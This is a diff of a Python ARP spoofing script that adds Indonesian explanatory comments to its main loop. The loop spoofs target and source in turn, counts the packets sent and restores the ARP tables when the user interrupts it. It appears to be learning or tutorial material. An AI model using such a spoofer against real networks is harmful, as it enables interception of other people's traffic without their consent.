@@ -64,17 +64,17 @@ def restore(dest_ip, src_ip): # funct untuk mengembalikan keadaan komputer korba
 
 # start def
 def main():
-    opt = get_args()
-    send_packet = 0
-    try:
+    opt = get_args() # panggil funct get_args dalam sebuah var
+    send_packet = 0 
+    try: # menjalankan/testing program yang dibuat
         while True:
-            spoof(opt.target, opt.source)
-            spoof(opt.source, opt.target)
+            spoof(opt.target, opt.source) # panggil funct spoof dengan parameter yang sudah di tentukan
+            spoof(opt.source, opt.target) # panggil funct spoof dengan parameter yang sudah di tentukan
             send_packet+=2
             print("\r[+] Packets Send:",send_packet, end=" ")
             time.sleep(2)
             
-    except KeyboardInterrupt:
+    except KeyboardInterrupt: # untuk menangani kasus jika terjadi kesalahan
         print("[-] Detected CTRL + C ...... Resetting ARP Table ....")
         restore(opt.target, opt.source) # panggil function restore
         
